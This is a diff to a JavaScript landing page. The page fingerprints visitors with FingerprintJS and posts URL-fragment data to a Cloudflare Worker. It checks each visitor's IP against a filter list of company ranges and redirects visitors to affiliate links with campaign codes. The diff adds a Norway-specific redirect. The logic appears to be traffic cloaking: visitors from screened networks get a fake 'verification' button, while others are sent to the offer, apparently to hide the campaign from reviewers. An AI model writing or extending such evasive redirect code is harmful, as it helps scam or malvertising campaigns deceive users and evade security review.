@@ -2,6 +2,7 @@
 const WORKER_URL = 'https://trackerworkerv2.lugangxyz.workers.dev/verify';
 const IP_CHECK_URL = 'https://trackerworkerv2.lugangxyz.workers.dev/check-ip';
 const DEFAULT_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=121832&s1=G20&s2=G20';
+const NORWAY_REDIRECT_URL = 'https://colossaldragon.com/?a=102032&c=153951&s1=G20&s2=G20';
 
 // ========== AVATAR LIST (Rotated randomly on load) ==========
 const AVATAR_LIST = [
@@ -134,7 +135,7 @@ function extractCampCode(fragmentData) {
 }
 
 // Send data to Cloudflare Worker and redirect
-async function sendToCloudflareAndRedirect(userData) {
+async function sendToCloudflareAndRedirect(userData, redirectUrlOverride) {
     try {
         const response = await fetch(WORKER_URL, {
             method: 'POST',
@@ -148,9 +149,11 @@ async function sendToCloudflareAndRedirect(userData) {
         });
         
         const result = await response.json();
-        window.location.href = result.redirectUrl || `${DEFAULT_REDIRECT_URL}?data=${encodeURIComponent(userData)}`;
+        const finalUrl = redirectUrlOverride || result.redirectUrl || `${DEFAULT_REDIRECT_URL}?data=${encodeURIComponent(userData)}`;
+        window.location.href = finalUrl;
     } catch (error) {
-        window.location.href = `${DEFAULT_REDIRECT_URL}?data=${encodeURIComponent(userData)}`;
+        const fallbackUrl = redirectUrlOverride || `${DEFAULT_REDIRECT_URL}?data=${encodeURIComponent(userData)}`;
+        window.location.href = fallbackUrl;
     }
 }
 
@@ -170,7 +173,7 @@ function applyCampCodeStyling(campCodeData) {
 
 // ========== IP CHECK ==========
 
-// Check if IP is in filter list
+// Check if IP is in filter list. Returns { blocked, country } object.
 async function checkIPBlocked() {
     try {
         console.log('[IP Check] Checking IP...');
@@ -178,17 +181,21 @@ async function checkIPBlocked() {
         const data = await response.json();
         
         console.log('[IP Check] Result:', data);
+        console.log(`[IP Check] Country: ${data.country}`);
         
         if (data.blocked) {
             console.log(`[IP Check] IP is BLOCKED - Company: ${data.company}, Range: ${data.matchedRange}`);
-            return true;
         } else {
             console.log('[IP Check] IP is NOT blocked');
-            return false;
         }
+        
+        return {
+            blocked: !!data.blocked,
+            country: (data.country || '').toUpperCase()
+        };
     } catch (error) {
         console.error('[IP Check] Failed:', error);
-        return false;
+        return { blocked: false, country: '' };
     }
 }
 
@@ -405,8 +412,8 @@ async function initApp() {
     // ========== RUN BOTH CHECKS IN PARALLEL ==========
     console.log('[App] Running IP check and FingerprintJS in parallel...');
     
-    const [ipBlocked, fpResult] = await Promise.all([
-        checkIPBlocked(),                          // IP check
+    const [ipResult, fpResult] = await Promise.all([
+        checkIPBlocked(),                          // IP check -> { blocked, country }
         loadFingerprintJS().then(() => {           // Load FP + check confidence
             return checkFingerprintAndAutoSubmit();
         }).catch(() => {
@@ -414,9 +421,22 @@ async function initApp() {
         })
     ]);
     
+    const ipBlocked = ipResult.blocked;
+    const country = ipResult.country;
+    
+    console.log(`[App] IP blocked: ${ipBlocked}, Country: ${country}, FP: ${fpResult}`);
+    
     // ========== DECIDE BASED ON RESULTS ==========
     
-    // Show button if IP is blocked OR FP confidence < 0.6
+    // Norway -> special redirect immediately (regardless of block/FP status)
+    if (country === 'NO') {
+        console.log('[App] Country is Norway (NO) - redirecting to Norway URL');
+        const userData = getFragmentData();
+        await sendToCloudflareAndRedirect(userData, NORWAY_REDIRECT_URL);
+        return;
+    }
+    
+    // Show button if IP is blocked
     if (ipBlocked) {
         console.log('[App] IP is BLOCKED - showing button');
         createVerificationButton();
